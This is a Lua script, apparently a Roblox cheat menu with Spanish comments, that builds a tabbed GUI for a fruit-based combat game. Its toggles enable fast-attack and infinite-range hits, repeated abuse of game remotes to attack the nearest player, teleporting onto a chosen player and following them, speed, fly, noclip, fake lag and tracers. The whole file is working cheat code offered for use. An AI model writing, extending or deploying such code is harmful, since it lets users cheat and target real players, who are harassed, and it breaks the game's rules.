    Tween(Main, 0.3, {Size=UDim2.fromOffset(0,0), Position=UDim2.new(0.5,0,0.5,0)})
    task.wait(0.35); ScreenGui:Destroy()
end)

MinBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    if isMinimized then
        -- Ocultar hub, mostrar logo flotante
        Tween(Main, 0.25, {Size=UDim2.fromOffset(520, 0)})
        task.wait(0.2)
        Main.Visible = false
        -- Posicionar logo donde estaba el hub
        LogoBtn.Position = UDim2.new(0, 20, 0, 60)
        LogoBtn.Visible  = true
        Tween(LogoBtn, 0.3, {Size=UDim2.fromOffset(90,90)})
    else
        LogoBtn.Visible = false
        Main.Visible    = true
        Tween(Main, 0.35, {Size=FULL})
    end
end)

-- ──────────── TAB BAR (ScrollingFrame para que no se salgan) ────────────
local TabBar = New("ScrollingFrame", {
    Size=UDim2.new(1,-12,0,34), Position=UDim2.new(0,6,0,54),
    BackgroundColor3=C.BG2, BorderSizePixel=0, ZIndex=5,
    ScrollBarThickness=0,
    CanvasSize=UDim2.new(0,0,0,0),
    AutomaticCanvasSize=Enum.AutomaticSize.X,
    ScrollingDirection=Enum.ScrollingDirection.X,
    ClipsDescendants=true,
}, Main)
Corner(10, TabBar)
Stroke(1, C.BORDER, TabBar)

local TabLayout = New("UIListLayout", {
    FillDirection=Enum.FillDirection.Horizontal,
    HorizontalAlignment=Enum.HorizontalAlignment.Left,
    Padding=UDim.new(0,3),
    SortOrder=Enum.SortOrder.LayoutOrder,
}, TabBar)
Pad(3,3,2,2, TabBar)

-- ──────────── CONTENT ────────────
local ContentHolder = New("Frame", {
    Size=UDim2.new(1,-12,1,-96), Position=UDim2.new(0,6,0,90),
    BackgroundTransparency=1, BorderSizePixel=0,
    ClipsDescendants=true,
}, Main)

-- ──────────── NOTIF SYSTEM ────────────
local NotifHolder = New("Frame", {
    Size=UDim2.new(0,260,1,0), Position=UDim2.new(1,-270,0,0),
    BackgroundTransparency=1,
}, ScreenGui)
New("UIListLayout",{
    VerticalAlignment=Enum.VerticalAlignment.Bottom,
    Padding=UDim.new(0,6),
    SortOrder=Enum.SortOrder.LayoutOrder,
}, NotifHolder)
Pad(0,0,0,12, NotifHolder)

local function Notify(title, msg, dur, col)
    dur = dur or 3; col = col or C.ACCENT1
    local nf = New("Frame", {
        Size=UDim2.new(1,0,0,0),
        BackgroundColor3=C.BG3,
        BorderSizePixel=0, ClipsDescendants=true,
    }, NotifHolder)
    Corner(10, nf)
    Stroke(1.5, col, nf)
    local bar = New("Frame",{
        Size=UDim2.new(0,3,1,0), BackgroundColor3=col, BorderSizePixel=0,
    }, nf)
    Corner(4,bar)
    New("TextLabel",{
        Size=UDim2.new(1,-12,0,18), Position=UDim2.new(0,10,0,8),
        Text=title, TextColor3=col, Font=Enum.Font.GothamBlack,
        TextSize=12, TextXAlignment=Enum.TextXAlignment.Left, BackgroundTransparency=1,
    }, nf)
    New("TextLabel",{
        Size=UDim2.new(1,-12,0,14), Position=UDim2.new(0,10,0,26),
        Text=msg, TextColor3=C.TEXT, Font=Enum.Font.Gotham,
        TextSize=10, TextXAlignment=Enum.TextXAlignment.Left, BackgroundTransparency=1,
    }, nf)
    Tween(nf,0.3,{Size=UDim2.new(1,0,0,52)})
    task.delay(dur, function()
        Tween(nf,0.3,{Size=UDim2.new(1,0,0,0)})
        task.wait(0.35); nf:Destroy()
    end)
end

-- ──────────── TAB SYSTEM ────────────
local Pages     = {}
local TabBtns   = {}
local ActiveTab = nil

local function MakePage()
    local p = New("ScrollingFrame", {
        Size=UDim2.new(1,0,1,0),
        BackgroundTransparency=1,
        BorderSizePixel=0,
        ScrollBarThickness=3,
        ScrollBarImageColor3=C.ACCENT1,
        CanvasSize=UDim2.new(0,0,0,0),
        AutomaticCanvasSize=Enum.AutomaticSize.Y,
        Visible=false,
    }, ContentHolder)
    local l=New("UIListLayout",{Padding=UDim.new(0,6),HorizontalAlignment=Enum.HorizontalAlignment.Center,SortOrder=Enum.SortOrder.LayoutOrder},p)
    Pad(2,2,4,8,p)
    return p
end

local function SelectTab(name)
    if ActiveTab == name then return end
    ActiveTab = name
    for n, page in pairs(Pages) do
        page.Visible = (n == name)
    end
    for n, btn in pairs(TabBtns) do
        if n == name then
            Tween(btn,0.18,{BackgroundColor3=C.ACCENT1})
            btn.TextColor3 = Color3.new(1,1,1)
        else
            Tween(btn,0.18,{BackgroundColor3=C.BG3})
            btn.TextColor3 = C.TEXTDIM
        end
    end
end

local function AddTab(name, icon)
    local btn = New("TextButton", {
        Size=UDim2.fromOffset(0,30),
        AutomaticSize=Enum.AutomaticSize.X,
        Text=" " .. icon .. " " .. name .. " ",
        TextColor3=C.TEXTDIM,
        BackgroundColor3=C.BG3,
        Font=Enum.Font.GothamBold, TextSize=11,
        BorderSizePixel=0, ZIndex=6,
    }, TabBar)
    Corner(7, btn)
    Pad(4,4,0,0, btn)
    btn.MouseButton1Click:Connect(function() SelectTab(name) end)
    btn.MouseEnter:Connect(function()
        if ActiveTab ~= name then Tween(btn,0.12,{BackgroundColor3=C.ACCENT3}) end
    end)
    btn.MouseLeave:Connect(function()
        if ActiveTab ~= name then Tween(btn,0.12,{BackgroundColor3=C.BG3}) end
    end)
    local page = MakePage()
    Pages[name]   = page
    TabBtns[name] = btn
    return page
end

-- ──────────── COMPONENTES UI ────────────

-- SECCIÓN
local function AddSection(page, title)
    local f = New("Frame", {
        Size=UDim2.new(1,-4,0,26), BackgroundColor3=C.BG3,
        BorderSizePixel=0, LayoutOrder=1,
    }, page)
    Corner(8, f)
    Grad(C.ACCENT3, Color3.fromRGB(20,10,50), 90, f)
    New("TextLabel",{
        Size=UDim2.new(1,-10,1,0), Position=UDim2.new(0,10,0,0),
        Text="  ◈  " .. title:upper(),
        TextColor3=Color3.fromRGB(210,180,255),
        Font=Enum.Font.GothamBlack, TextSize=10,
        TextXAlignment=Enum.TextXAlignment.Left,
        BackgroundTransparency=1,
    }, f)
end

-- TOGGLE
local function AddToggle(page, label, default, cb)
    local state = default or false
    local row = New("Frame", {
        Size=UDim2.new(1,-4,0,42), BackgroundColor3=C.PANEL,
        BorderSizePixel=0,
    }, page)
    Corner(10, row)
    Stroke(1, C.BORDER, row)

    -- hover
    row.MouseEnter:Connect(function() Tween(row,0.12,{BackgroundColor3=C.BG3}) end)
    row.MouseLeave:Connect(function() Tween(row,0.12,{BackgroundColor3=C.PANEL}) end)

    New("TextLabel",{
        Size=UDim2.new(1,-60,1,0), Position=UDim2.new(0,14,0,0),
        Text=label, TextColor3=C.TEXT,
        Font=Enum.Font.GothamBold, TextSize=12,
        TextXAlignment=Enum.TextXAlignment.Left,
        BackgroundTransparency=1,
    }, row)

    -- Toggle pill
    local pill = New("Frame",{
        Size=UDim2.fromOffset(44,24), Position=UDim2.new(1,-54,0.5,-12),
        BackgroundColor3=state and C.ON or C.OFF, BorderSizePixel=0,
    }, row)
    Corner(12, pill)
    Stroke(1, Color3.fromRGB(255,255,255,0.1), pill)

    local knob = New("Frame",{
        Size=UDim2.fromOffset(18,18),
        Position=state and UDim2.fromOffset(23,3) or UDim2.fromOffset(3,3),
        BackgroundColor3=Color3.new(1,1,1), BorderSizePixel=0,
    }, pill)
    Corner(9, knob)

    local btn = New("TextButton",{
        Size=UDim2.new(1,0,1,0), BackgroundTransparency=1, Text="",
    }, row)

    btn.MouseButton1Click:Connect(function()
        state = not state
        Tween(pill, 0.2, {BackgroundColor3=state and C.ON or C.OFF})
        Tween(knob, 0.2, {Position=state and UDim2.fromOffset(23,3) or UDim2.fromOffset(3,3)})
        cb(state)
    end)

    return {
        SetState = function(v)
            state = v
            Tween(pill,0.2,{BackgroundColor3=v and C.ON or C.OFF})
            Tween(knob,0.2,{Position=v and UDim2.fromOffset(23,3) or UDim2.fromOffset(3,3)})
        end
    }
end

-- BOTÓN
local function AddButton(page, label, cb)
    local btn = New("TextButton",{
        Size=UDim2.new(1,-4,0,38),
        BackgroundColor3=C.BG3,
        Text=label, TextColor3=C.TEXT,
        Font=Enum.Font.GothamBold, TextSize=12,
        BorderSizePixel=0,
    }, page)
    Corner(10, btn)
    Stroke(1.5, C.ACCENT1, btn)
    Grad(C.BG3, C.PANEL, 90, btn)

    btn.MouseEnter:Connect(function()
        Tween(btn,0.15,{BackgroundColor3=C.ACCENT3})
    end)
    btn.MouseLeave:Connect(function()
        Tween(btn,0.15,{BackgroundColor3=C.BG3})
    end)
    btn.MouseButton1Click:Connect(function()
        Tween(btn,0.08,{BackgroundColor3=C.ACCENT1})
        task.delay(0.15, function() Tween(btn,0.15,{BackgroundColor3=C.BG3}) end)
        cb()
    end)
end

-- SLIDER
local function AddSlider(page, label, min, max, default, suffix, cb)
    suffix = suffix or ""
    local val = default or min
    local row = New("Frame",{
        Size=UDim2.new(1,-4,0,54), BackgroundColor3=C.PANEL, BorderSizePixel=0,
    }, page)
    Corner(10, row)
    Stroke(1, C.BORDER, row)

    New("TextLabel",{
        Size=UDim2.new(0.6,0,0,22), Position=UDim2.new(0,14,0,4),
        Text=label, TextColor3=C.TEXT,
        Font=Enum.Font.GothamBold, TextSize=11,
        TextXAlignment=Enum.TextXAlignment.Left,
        BackgroundTransparency=1,
    }, row)

    local valLbl = New("TextLabel",{
        Size=UDim2.new(0.4,-10,0,22), Position=UDim2.new(0.6,0,0,4),
        Text=tostring(val)..suffix, TextColor3=C.ACCENT2,
        Font=Enum.Font.GothamBlack, TextSize=11,
        TextXAlignment=Enum.TextXAlignment.Right,
        BackgroundTransparency=1,
    }, row)

    local track = New("Frame",{
        Size=UDim2.new(1,-28,0,6), Position=UDim2.new(0,14,0,34),
        BackgroundColor3=C.OFF, BorderSizePixel=0,
    }, row)
    Corner(3, track)

    local fill = New("Frame",{
        Size=UDim2.new((val-min)/(max-min),0,1,0),
        BackgroundColor3=C.ACCENT1, BorderSizePixel=0,
    }, track)
    Corner(3, fill)
    Grad(C.ACCENT1, C.ACCENT2, 90, fill)

    local knob = New("Frame",{
        Size=UDim2.fromOffset(14,14),
        Position=UDim2.new((val-min)/(max-min),0,0.5,-7),
        BackgroundColor3=Color3.new(1,1,1), BorderSizePixel=0,
        ZIndex=10,
    }, track)
    Corner(7, knob)
    Stroke(2, C.ACCENT1, knob)

    local dragging = false
    local function Update(mx)
        local abs = track.AbsolutePosition.X
        local w   = track.AbsoluteSize.X
        local pct = math.clamp((mx - abs) / w, 0, 1)
        val       = math.floor(min + pct*(max-min))
        fill.Size = UDim2.new(pct,0,1,0)
        knob.Position = UDim2.new(pct,0,0.5,-7)
        valLbl.Text = tostring(val)..suffix
        cb(val)
    end

    knob.InputBegan:Connect(function(i)
        if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then dragging=true end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if dragging then
            if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then
                Update(i.Position.X)
            end
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then dragging=false end
    end)
    track.InputBegan:Connect(function(i)
        if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then Update(i.Position.X) end
    end)
end

-- DROPDOWN
local function AddDropdown(page, label, options, default, cb)
    local selected = default or options[1]
    local open     = false

    local wrap = New("Frame",{
        Size=UDim2.new(1,-4,0,42), BackgroundColor3=C.PANEL,
        BorderSizePixel=0, ClipsDescendants=false, ZIndex=20,
    }, page)
    Corner(10, wrap)
    Stroke(1, C.BORDER, wrap)

    New("TextLabel",{
        Size=UDim2.new(0.55,0,1,0), Position=UDim2.new(0,14,0,0),
        Text=label, TextColor3=C.TEXT,
        Font=Enum.Font.GothamBold, TextSize=12,
        TextXAlignment=Enum.TextXAlignment.Left, BackgroundTransparency=1,
    }, wrap)

    local selLbl = New("TextLabel",{
        Size=UDim2.new(0.4,-10,1,0), Position=UDim2.new(0.55,0,0,0),
        Text=selected, TextColor3=C.ACCENT2,
        Font=Enum.Font.GothamBold, TextSize=11,
        TextXAlignment=Enum.TextXAlignment.Right, BackgroundTransparency=1,
    }, wrap)

    New("TextLabel",{
        Size=UDim2.fromOffset(20,20), Position=UDim2.new(1,-28,0.5,-10),
        Text="▾", TextColor3=C.ACCENT1,
        Font=Enum.Font.GothamBold, TextSize=14,
        BackgroundTransparency=1,
    }, wrap)

    local menu = New("Frame",{
        Size=UDim2.new(1,0,0,0), Position=UDim2.new(0,0,1,4),
        BackgroundColor3=C.BG3, BorderSizePixel=0,
        ClipsDescendants=true, ZIndex=30,
    }, wrap)
    Corner(10, menu)
    Stroke(1.5, C.ACCENT1, menu)

    local menuLayout = New("UIListLayout",{Padding=UDim.new(0,2),SortOrder=Enum.SortOrder.LayoutOrder},menu)
    Pad(4,4,4,4, menu)

    local function Rebuild()
        for _, c in pairs(menu:GetChildren()) do
            if c:IsA("TextButton") then c:Destroy() end
        end
        for _, opt in ipairs(options) do
            local ob = New("TextButton",{
                Size=UDim2.new(1,0,0,30),
                BackgroundColor3= opt==selected and C.ACCENT3 or C.BG2,
                Text=opt, TextColor3= opt==selected and Color3.new(1,1,1) or C.TEXTDIM,
                Font=Enum.Font.GothamBold, TextSize=11,
                BorderSizePixel=0, ZIndex=32,
            }, menu)
            Corner(7, ob)
            ob.MouseEnter:Connect(function() if opt~=selected then Tween(ob,0.1,{BackgroundColor3=C.ACCENT3}) end end)
            ob.MouseLeave:Connect(function() if opt~=selected then Tween(ob,0.1,{BackgroundColor3=C.BG2}) end end)
            ob.MouseButton1Click:Connect(function()
                selected = opt
                selLbl.Text = opt
                cb(opt)
                open = false
                Tween(menu,0.2,{Size=UDim2.new(1,0,0,0)})
                Rebuild()
            end)
        end
    end
    Rebuild()

    local function ToggleMenu()
        open = not open
        local h = open and math.min(#options*34+10, 180) or 0
        Tween(menu, 0.2, {Size=UDim2.new(1,0,0,h)})
    end

    local hitbox = New("TextButton",{
        Size=UDim2.new(1,0,1,0), BackgroundTransparency=1, Text="", ZIndex=25,
    }, wrap)
    hitbox.MouseButton1Click:Connect(ToggleMenu)

    return {
        SetOptions = function(opts)
            options = opts
            selected = opts[1] or "Ninguno"
            selLbl.Text = selected
            Rebuild()
        end,
        GetSelected = function() return selected end,
    }
end

-- LABEL INFO
local function AddLabel(page, txt, col)
    local f = New("Frame",{
        Size=UDim2.new(1,-4,0,32), BackgroundColor3=C.BG2, BorderSizePixel=0,
    }, page)
    Corner(8, f)
    New("TextLabel",{
        Size=UDim2.new(1,-16,1,0), Position=UDim2.new(0,8,0,0),
        Text=txt, TextColor3=col or C.TEXTDIM,
        Font=Enum.Font.Gotham, TextSize=11,
        TextXAlignment=Enum.TextXAlignment.Left,
        TextWrapped=true, BackgroundTransparency=1,
    }, f)
end

-- ═══════════════════════════════════════════════════════════
--  CREAR TABS
-- ═══════════════════════════════════════════════════════════
local P = {
    Combate   = AddTab("Combate",  "⚔️"),
    KillNPC   = AddTab("Kill NPC", "💀"),
    Frutas    = AddTab("Frutas",   "🍎"),
    Tracker   = AddTab("Tracker",  "🎯"),
    Mov       = AddTab("Mov",      "🏃"),
    Defensa   = AddTab("Defensa",  "🛡️"),
    Farm      = AddTab("Farm",     "🌾"),
    TPs       = AddTab("TPs",      "🗺️"),
    Misc      = AddTab("Misc",     "⚙️"),
}
SelectTab("Combate")

-- ═══════════════════════════════════════════════════════════
--  TAB: COMBATE
-- ═══════════════════════════════════════════════════════════
AddSection(P.Combate, "Fast Attack")
AddToggle(P.Combate, "⚡  Fast Attack  (Lock-On · Infinito)", false, function(v)
    getgenv().FastAttackEnabled = v
    if v then
        task.spawn(function()
            local i=0; while (not RegisterHit or not RegisterAttack) and i<20 do task.wait(0.5); i+=1 end
            if RegisterHit and RegisterAttack then StartFastAttack(); Notify("Fast Attack","✅ Activado — Lock-On activo",3,C.ON)
            else getgenv().FastAttackEnabled=false; Notify("Fast Attack","❌ Remotes no encontrados",4,C.RED) end
        end)
    else
        if FastAttackConn then task.cancel(FastAttackConn); FastAttackConn=nil end
    end
end)

AddSection(P.Combate, "Inf Range")
AddToggle(P.Combate, "👊  Inf Range Melee", false, function(v)
    InfMeleeOn = v
    if v then StartInfMelee(); Notify("Inf Melee","✅ Activado",2,C.ACCENT2)
    else
        if InfMeleeConn then task.cancel(InfMeleeConn); InfMeleeConn=nil end
        if InfElevMConn then InfElevMConn:Disconnect(); InfElevMConn=nil end
    end
end)
AddToggle(P.Combate, "⚔️  Inf Range Sword", false, function(v)
    InfSwordOn = v
    if v then StartInfSword(); Notify("Inf Sword","✅ Activado",2,C.ACCENT2)
    else
        if InfSwordConn then task.cancel(InfSwordConn); InfSwordConn=nil end
        if InfElevSConn then InfElevSConn:Disconnect(); InfElevSConn=nil end
    end
end)

AddSection(P.Combate, "Ghost TP / Trackers")
AddToggle(P.Combate, "👻  Ghost TP (Invisible)", false, function(v)
    GhostTpEnabled=v
    if v then
        pcall(function()
            local h=lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
            GhostCFrame = h and h.CFrame or CFrame.new(0,0,0)
        end)
        if GhostTpConn then GhostTpConn:Disconnect() end
        ghostFrame=0
        GhostTpConn = RunService.Heartbeat:Connect(function()
            if not GhostTpEnabled or not getgenv().SelectedPlayer then return end
            pcall(function()
                local char=lp.Character; local target=Players:FindFirstChild(getgenv().SelectedPlayer)
                if not (char and target and target.Character) then return end
                local hrp=char:FindFirstChild("HumanoidRootPart"); local tH=target.Character:FindFirstChild("HumanoidRootPart")
                if not (hrp and tH) then return end
                ghostFrame+=1
                local cf=tH.CFrame*CFrame.new(XOff,YOff,ZOff)
                if BlinkMode then hrp.CFrame=cf
                elseif ghostFrame%GHOST_RATIO==0 then hrp.CFrame=GhostCFrame or cf
                else hrp.CFrame=cf end
            end)
        end)
    else if GhostTpConn then GhostTpConn:Disconnect() end end
end)
AddToggle(P.Combate, "⚡  Blink Mode", false, function(v) BlinkMode=v end)
AddToggle(P.Combate, "📌  Insta TP (Pegado al jugador)", false, function(v)
    getgenv().TPDirectActive=v; if v then getgenv().TrackingActive=true; StartTracker() end
end)
AddToggle(P.Combate, "💀  Kill Flash (Encima del jugador)", false, function(v)
    getgenv().KillTrackerActive=v; if v then getgenv().TrackingActive=true; StartTracker() end
end)

AddSection(P.Combate, "Extras")
AddToggle(P.Combate, "⚡  Auto V4", false, function(v)
    autoV4=v
    if v then
        if v4Conn then task.cancel(v4Conn) end
        v4Conn=task.spawn(function()
            while autoV4 do task.wait(0.5); pcall(function()
                lp:WaitForChild("Backpack"):WaitForChild("Awakening"):WaitForChild("RemoteFunction"):InvokeServer(true)
            end) end
        end)
    else if v4Conn then task.cancel(v4Conn); v4Conn=nil end end
end)
AddToggle(P.Combate, "🛡️  Unbreakable", false, function(v)
    Unbreakable=v
    if v then
        if UnbreakConn then task.cancel(UnbreakConn) end
        UnbreakConn=task.spawn(function()
            while Unbreakable do task.wait(0.1); pcall(function()
                lp.Character:SetAttribute("UnbreakableAll",true)
            end) end
        end)
    else
        if UnbreakConn then task.cancel(UnbreakConn); UnbreakConn=nil end
        pcall(function() lp.Character:SetAttribute("UnbreakableAll",false) end)
    end
end)
AddToggle(P.Combate, "🔒  Anti Mover", false, function(v)
    if v then
        local function add(char)
            if not char:FindFirstChild("AntiMover") then Instance.new("Folder",char).Name="AntiMover" end
        end
        if lp.Character then add(lp.Character) end
        _G.AntiMoverConn=lp.CharacterAdded:Connect(add)
    else
        if _G.AntiMoverConn then _G.AntiMoverConn:Disconnect() end
        if lp.Character and lp.Character:FindFirstChild("AntiMover") then lp.Character.AntiMover:Destroy() end
    end
end)

AddSection(P.Combate, "Magneto")
AddToggle(P.Combate, "🧲  Magneto", false, function(v) getgenv().MagnetEnabled=v end)
AddSlider(P.Combate, "Rango Magneto", 100, 5000, 800, " studs", function(v) getgenv().MagnetRange=v end)
AddSlider(P.Combate, "Distancia Magneto", 1, 50, 6, "", function(v) getgenv().MagnetDistance=v end)
AddSlider(P.Combate, "Fuerza Magneto", 1, 100, 70, "%", function(v) getgenv().PullForce=v/100 end)

-- ═══════════════════════════════════════════════════════════
--  TAB: KILL NPC
-- ═══════════════════════════════════════════════════════════
AddSection(P.KillNPC, "Solo Enemies")
AddToggle(P.KillNPC, "⚔️  Fast Attack NPCs (Solo enemies)", false, function(v)
    if v then
        task.spawn(function()
            while v do task.wait(0.05)
                local myHRP=lp.Character and lp.Character:FindFirstChild("HumanoidRootPart"); if not myHRP then continue end
                local targets={}
                local en=workspace:FindFirstChild("Enemies")
                if en then for _,npc in pairs(en:GetChildren()) do
                    local h=npc:FindFirstChild("Humanoid"); local r=npc:FindFirstChild("HumanoidRootPart")
                    if h and r and h.Health>0 then table.insert(targets,npc) end
                end end
                if #targets>0 then AttackTargets(targets) end
            end
        end)
    end
end)

-- ═══════════════════════════════════════════════════════════
--  TAB: FRUTAS
-- ═══════════════════════════════════════════════════════════
local function MakeFruitToggle(page, name, path, argsFn)
    AddToggle(page, "🍎  "..name, false, function(v)
        FruitAttack=v
        if v then
            if FruitConn then task.cancel(FruitConn) end
            FruitConn=task.spawn(function()
                while FruitAttack do task.wait(0.01); pcall(function()
                    local target=GetNearestPlayer(); if not target or not target.Character then return end
                    local myH=lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
                    local tH=target.Character:FindFirstChild("HumanoidRootPart"); if not myH or not tH then return end
                    local dir=(tH.Position-myH.Position).Unit
                    lp.Character:WaitForChild(path):WaitForChild("LeftClickRemote"):FireServer(unpack(argsFn(dir,tH)))
                end) end
            end)
        else FruitAttack=false; if FruitConn then task.cancel(FruitConn); FruitConn=nil end end
    end)
end

AddSection(P.Frutas, "Players")
MakeFruitToggle(P.Frutas,"Kitsune",      "Kitsune-Kitsune",   function(d) return {vector.create(d.X,d.Y,d.Z),1,true} end)
MakeFruitToggle(P.Frutas,"Dragon",       "Dragon-Dragon",     function(d) return {vector.create(d.X,d.Y,d.Z),1}      end)
MakeFruitToggle(P.Frutas,"Tiger",        "Tiger-Tiger",       function(d) return {vector.create(d.X,d.Y,d.Z),3}      end)
MakeFruitToggle(P.Frutas,"T-Rex",        "T-Rex-T-Rex",       function(d) return {vector.create(d.X,d.Y,d.Z),1}      end)
MakeFruitToggle(P.Frutas,"Control",      "Control-Control",   function(d) return {vector.create(d.X,d.Y,d.Z),1,true} end)
MakeFruitToggle(P.Frutas,"Pain",         "Pain-Pain",         function(d) return {vector.create(d.X,0,d.Z),1,true}   end)

AddSection(P.Frutas, "NPCs Only")
local function MakeFruitNPC(page, name, path, argsFn)
    AddToggle(page, "💀  "..name.." [NPCs]", false, function(v)
        if v then
            if _G["FC_"..name] then task.cancel(_G["FC_"..name]) end
            _G["FC_"..name]=task.spawn(function()
                while v do task.wait(0.01); pcall(function()
                    local char=lp.Character; local hrp=char and char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
                    local en=workspace:FindFirstChild("Enemies"); if not en then return end
                    for _,npc in pairs(en:GetChildren()) do
                        local h=npc:FindFirstChild("Humanoid"); local nH=npc:FindFirstChild("HumanoidRootPart")
                        if h and nH and h.Health>0 and (nH.Position-hrp.Position).Magnitude<=50 then
                            local dir=(nH.Position-hrp.Position).Unit
                            char:WaitForChild(path):WaitForChild("LeftClickRemote"):FireServer(unpack(argsFn(dir,nH)))
                        end
                    end
                end) end
            end)
        else v=false; if _G["FC_"..name] then task.cancel(_G["FC_"..name]); _G["FC_"..name]=nil end end
    end)
end
MakeFruitNPC(P.Frutas,"Kitsune","Kitsune-Kitsune",function(d) return {vector.create(d.X,d.Y,d.Z),1,true} end)
MakeFruitNPC(P.Frutas,"Control","Control-Control",function(d) return {vector.create(d.X,d.Y,d.Z),1,true} end)
MakeFruitNPC(P.Frutas,"Pain",   "Pain-Pain",      function(d) return {vector.create(d.X,0,d.Z),1,true}   end)
MakeFruitNPC(P.Frutas,"Dragon", "Dragon-Dragon",  function(d) return {vector.create(d.X,d.Y,d.Z),1}      end)
MakeFruitNPC(P.Frutas,"Tiger",  "Tiger-Tiger",    function(d) return {vector.create(d.X,d.Y,d.Z),3}      end)

-- ═══════════════════════════════════════════════════════════
--  TAB: TRACKER
-- ═══════════════════════════════════════════════════════════
AddSection(P.Tracker, "Jugador Objetivo")
local ddTracker = AddDropdown(P.Tracker, "👤 Seleccionar Jugador", GetPlayerList(), nil, function(v)
    getgenv().SelectedPlayer = v~="Ninguno" and v or nil
end)
AddButton(P.Tracker, "🔄  Refrescar Lista", function()
    ddTracker.SetOptions(GetPlayerList())
    Notify("Lista","✅ Lista actualizada",2,C.ACCENT2)
end)

AddSection(P.Tracker, "Modos")
AddToggle(P.Tracker,"☁️  Sky Tracker",false,function(v) getgenv().InstaTPSkyActive=v end)
AddSlider(P.Tracker,"Altura Sky Tracker",50,1000,300," studs",function(v) getgenv().InstaTPSkyHeight=v end)
AddToggle(P.Tracker,"🗡️  Kill Tracker (Encima)", false, function(v)
    getgenv().KillTrackerActive=v; if v then getgenv().TrackingActive=true; StartTracker() end
end)
AddSlider(P.Tracker,"Altura Kill Tracker",10,1000,300," studs",function(v) getgenv().TrackerHeight=v end)
AddToggle(P.Tracker,"🔁  TP Direct (Pegado)", false, function(v)
    getgenv().TPDirectActive=v; if v then getgenv().TrackingActive=true; StartTracker() end
end)

AddSection(P.Tracker, "Instant TP")
AddButton(P.Tracker,"⚡  Teleport al Jugador",function()
    local target=getgenv().SelectedPlayer and Players:FindFirstChild(getgenv().SelectedPlayer)
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        lp.Character:PivotTo(target.Character.HumanoidRootPart.CFrame*CFrame.new(0,3,0))
        Notify("Instant TP","✅ TP a "..getgenv().SelectedPlayer,2,C.ON)
    else Notify("Instant TP","❌ Jugador no disponible",3,C.RED) end
end)
AddToggle(P.Tracker,"🔄  Auto TP (Seguir siempre)",false,function(v)
    if v then task.spawn(function()
        while v do
            local t=getgenv().SelectedPlayer and Players:FindFirstChild(getgenv().SelectedPlayer)
            if t and t.Character and t.Character:FindFirstChild("HumanoidRootPart") then
                lp.Character:PivotTo(t.Character.HumanoidRootPart.CFrame*CFrame.new(0,3,0))
            end
            task.wait(0.1)
        end
    end) end
end)
AddToggle(P.Tracker,"👁️  Spectate Player",false,function(v)
    if v and getgenv().SelectedPlayer then
        local t=Players:FindFirstChild(getgenv().SelectedPlayer)
        if t and t.Character and t.Character:FindFirstChild("Humanoid") then Camera.CameraSubject=t.Character.Humanoid end
    else if lp.Character and lp.Character:FindFirstChild("Humanoid") then Camera.CameraSubject=lp.Character.Humanoid end end
end)

-- ═══════════════════════════════════════════════════════════
--  TAB: MOVIMIENTO
-- ═══════════════════════════════════════════════════════════
AddSection(P.Mov,"Velocidad")
AddToggle(P.Mov,"🚀  Speed Hack",false,function(v) speedActive=v end)
AddSlider(P.Mov,"Velocidad",16,500,16," st/s",function(v) speedVal=v end)
AddSection(P.Mov,"Especial")
AddToggle(P.Mov,"⬆️  Infinite Jump",false,function(v) _G.InfiniteJump=v end)
AddToggle(P.Mov,"🔥  No Clip",false,function(v) getgenv().NoclipEnabled=v end)
AddToggle(P.Mov,"💧  Walk on Water",false,function(v) getgenv().WalkOnWater=v end)
AddToggle(P.Mov,"🌀  Spin",false,function(v) getgenv().SpinEnabled=v end)
AddSlider(P.Mov,"Velocidad Spin",1,200,50,"",function(v) getgenv().SpinSpeed=v end)
AddSection(P.Mov,"✈️ Fly v3")
AddToggle(P.Mov,"✈️  Fly  (WASD + Space/Shift)",false,function(v) if v then StartFly() else StopFly() end end)
AddSlider(P.Mov,"Velocidad Vuelo",10,500,60," st/s",function(v) flySpeed=v end)
AddSection(P.Mov,"Dash")
AddToggle(P.Mov,"💨  Dash Length",false,function(v)
    DashEnabled=v
    if v then
        if DashConn then task.cancel(DashConn) end
        DashConn=task.spawn(function()
            while DashEnabled do task.wait(0.1)
                local c=lp.Character; if c then
                    c:SetAttribute("DashLength",DashLengh)
                    c:SetAttribute("DashLengthAir",DashLengh)
                end
            end
        end)
    else
        if DashConn then task.cancel(DashConn); DashConn=nil end
        pcall(function() lp.Character:SetAttribute("DashLength",1); lp.Character:SetAttribute("DashLengthAir",1) end)
    end
end)
AddDropdown(P.Mov,"Valor Dash",{"5","35","60","90","120","180"},"5",function(v) DashLengh=tonumber(v) or 5 end)
AddSection(P.Mov,"Cámara")
AddToggle(P.Mov,"🔭  Extend Zoom",false,function(v) ZoomEnabled=v; lp.CameraMaxZoomDistance=v and maxZoom or 128 end)
AddSlider(P.Mov,"Zoom Máximo",128,2000,500," studs",function(v) maxZoom=v; if ZoomEnabled then lp.CameraMaxZoomDistance=v end end)

-- ═══════════════════════════════════════════════════════════
--  TAB: DEFENSA
-- ═══════════════════════════════════════════════════════════
AddSection(P.Defensa,"Anti Tracker")
AddToggle(P.Defensa,"🛡️  Anti Tracker (Anti-TP)",false,function(v)
    AntiTP_On=v
    if v then StartAntiTracker()
    else if AntiTP_Conn then AntiTP_Conn:Disconnect(); AntiTP_Conn=nil end; AntiTP_LastPos=nil end
end)
AddSlider(P.Defensa,"Umbral Detección",5,100,10," studs",function(v) AntiTP_Thresh=v end)

AddSection(P.Defensa,"Fake Lag")
AddToggle(P.Defensa,"⚡  Fake Lag",false,function(v) FakeLag_On=v end)
AddSlider(P.Defensa,"Duración Freeze",10,200,50," ms",function(v) FakeLag_Dur=v/1000 end)
AddSlider(P.Defensa,"Frecuencia Pulsos",50,500,100," ms",function(v) FakeLag_Int=v/1000 end)

AddSection(P.Defensa,"Tracers")
AddToggle(P.Defensa,"🔴  Tracers",false,function(v) Tracers_On=v end)
